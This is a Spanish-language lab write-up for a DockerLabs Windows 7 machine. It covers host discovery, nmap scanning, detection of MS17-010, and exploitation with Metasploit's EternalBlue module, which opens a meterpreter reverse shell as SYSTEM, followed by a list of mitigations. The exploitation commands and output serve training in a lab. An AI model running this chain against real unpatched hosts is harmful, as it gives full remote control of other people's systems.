# Microbug-Dockerlabs
Máquina Windows vulnerable por el puerto 445 SMB.
# Mario — DockerLabs

> **Dificultad:** Fácil
> **Sistema Operativo:** Windows 7 Ultimate SP1
> **Técnica principal:** Explotación de MS17-010 (EternalBlue)
> **Autor del writeup:** David Rodríguez Somolinos

---

## Índice

1. [Descubrimiento del host](#1-descubrimiento-del-host)
2. [Escaneo de puertos y servicios](#2-escaneo-de-puertos-y-servicios)
3. [Análisis de vulnerabilidades](#3-análisis-de-vulnerabilidades)
4. [Explotación — EternalBlue](#4-explotación--eternalblue-ms17-010)
5. [Post-explotación y prueba de compromiso](#5-post-explotación-y-prueba-de-compromiso)
6. [Mitigaciones](#6-mitigaciones)

---

## 1. Descubrimiento del host

Primero identificamos la IP de la máquina víctima dentro de la red local con `arp-scan`:

```bash
sudo arp-scan -I eth0 --localnet
```

```
192.168.5.1     58:d9:d5:9a:91:e0   (Unknown)
192.168.5.14    58:d9:d5:9a:91:f0   (Unknown)
192.168.5.143   08:00:27:42:5d:a2   (Unknown)
192.168.5.192   50:2e:91:40:32:60   (Unknown)
```

La IP `192.168.5.143` tiene una MAC con prefijo `08:00:27`, que corresponde a **VirtualBox**, así que es nuestra máquina objetivo.

Comprobamos conectividad y aprovechamos el TTL para intuir el sistema operativo:

```bash
ping -c 1 192.168.5.143
```

```
64 bytes from 192.168.5.143: icmp_seq=1 ttl=128 time=1.88 ms
```

Un **TTL de 128** apunta a que el objetivo es **Windows** (Linux suele responder con 64).

![arp-scan y ping](images/01-descubrimiento.png)

---

## 2. Escaneo de puertos y servicios

Lanzamos un escaneo completo de los 65535 puertos TCP con detección de versiones y scripts por defecto:

```bash
sudo nmap -p- -sV -sC -sS -vvv -Pn -n -T5 192.168.5.143
```

| Flag | Función |
|------|---------|
| `-p-` | Escanea los 65535 puertos |
| `-sV` | Detección de versión de los servicios |
| `-sC` | Scripts NSE por defecto |
| `-sS` | SYN scan (sigiloso) |
| `-Pn` | Omite el descubrimiento de host (asume que está activo) |
| `-n`  | Sin resolución DNS |
| `-T5` | Plantilla de tiempo agresiva |

### Puertos abiertos

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows 7 Ultimate 7601 Service Pack 1 (workgroup: WORKGROUP)
5000/tcp open  upnp?
```

### Información del sistema

- **SO:** Windows 7 Ultimate 7601 Service Pack 1 (`cpe:/o:microsoft:windows_7::sp1`)
- **Hostname:** MARIO-PC
- **Workgroup:** WORKGROUP
- **MAC:** 08:00:27:42:5D:A2 (Oracle VirtualBox)
- **SMB:** firma de mensajes soportada pero **no requerida** (*dangerous, but default*)

![Escaneo nmap](images/02-nmap.png)

---

## 3. Análisis de vulnerabilidades

Dado que el objetivo es un Windows 7 SP1 con SMBv1 expuesto en el puerto 445, comprobamos la vulnerabilidad más probable con los scripts NSE de categoría `vuln`:

```bash
sudo nmap -p445 --script=vuln 192.168.5.143
```

```
Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
```

El objetivo es **vulnerable a MS17-010 (EternalBlue)**, la vulnerabilidad de ejecución remota de código en SMBv1. Es el mismo fallo que explotó el ransomware WannaCry en 2017.

| Dato | Valor |
|------|-------|
| CVE | CVE-2017-0143 |
| Nombre | EternalBlue (MS17-010) |
| Servicio | SMBv1 (puerto 445) |
| Impacto | Ejecución remota de código como `NT AUTHORITY\SYSTEM` |
| Riesgo | HIGH |

![smb-vuln-ms17-010](images/03-ms17-010.png)

---

## 4. Explotación — EternalBlue (MS17-010)

Usamos Metasploit para explotar la vulnerabilidad. Buscamos el módulo por CVE:

```bash
msfconsole -q
search CVE-2017-0143
```

Seleccionamos el módulo de EternalBlue:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

El payload por defecto es `windows/x64/meterpreter/reverse_tcp`. Configuramos el objetivo (RHOSTS) y nuestra IP de escucha (LHOST, la interfaz `eth0` del atacante):

```bash
set RHOSTS 192.168.5.143
set LHOST 192.168.5.31
run
```

El exploit confirma el objetivo, sobrescribe el buffer corrupto y abre la sesión:

```
[*] Started reverse TCP handler on 192.168.5.31:4444
[+] 192.168.5.143:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.5.143:445 - The target is vulnerable.
[*] 192.168.5.143:445 - Connecting to target for exploitation.
[+] 192.168.5.143:445 - Connection established for exploitation.
[+] 192.168.5.143:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.5.143:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.5.143:445 - Sending all but last fragment of exploit packet
[+] 192.168.5.143:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Meterpreter session 1 opened (192.168.5.31:4444 -> 192.168.5.143:49158)
```

![Módulo EternalBlue en Metasploit](images/04-msf-eternalblue.png)

---

## 5. Post-explotación y prueba de compromiso

Una vez abierta la sesión de Meterpreter, confirmamos el usuario obtenido:

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Hemos accedido directamente como **NT AUTHORITY\SYSTEM**, el máximo privilegio en Windows. Al tratarse de una vulnerabilidad a nivel de kernel (SMBv1), no es necesaria ninguna escalada de privilegios posterior.

Abrimos una shell interactiva del sistema para navegar por los ficheros:

```cmd
meterpreter > shell

C:\Windows> cd ..
C:\> dir
```

```
 Directory of C:\
07/13/2009  07:20 PM    <DIR>    PerfLogs
02/16/2024  10:58 AM    <DIR>    Program Files
02/16/2024  10:57 AM    <DIR>    Program Files (x86)
07/24/2023  07:14 PM    <DIR>    Users
07/24/2023  10:17 AM    <DIR>    Windows
```

Navegamos hasta el directorio del usuario `mario`:

```cmd
C:\> cd Users
C:\Users> cd mario
C:\Users\mario> dir
```

```
 Directory of C:\Users\mario
<DIR>  Contacts    <DIR>  Desktop     <DIR>  Documents
<DIR>  Downloads   <DIR>  Favorites   <DIR>  Links
<DIR>  Music       <DIR>  Pictures    <DIR>  Saved Games
<DIR>  Searches    <DIR>  Videos
```

---

## 6. Mitigaciones

La máquina es vulnerable por ejecutar un sistema sin soporte y con SMBv1 habilitado. Las medidas correctoras serían:

- **Aplicar el parche MS17-010**, publicado por Microsoft en marzo de 2017.
- **Deshabilitar SMBv1** por completo, usando únicamente SMBv2/SMBv3.
- **Migrar a un sistema operativo con soporte**, ya que Windows 7 llegó a fin de vida en enero de 2020.
- **Segmentar la red** y restringir el acceso al puerto 445 mediante firewall, evitando su exposición.
- **Requerir la firma de mensajes SMB** (*message signing: required*) para dificultar ataques de tipo relay.

---

## Resumen de la cadena de ataque

```
arp-scan (descubrimiento)
   └─> nmap -p- (Windows 7 SP1, SMB 445 abierto)
        └─> nmap --script vuln (MS17-010 VULNERABLE)
             └─> Metasploit ms17_010_eternalblue
                  └─> Meterpreter como NT AUTHORITY\SYSTEM
```
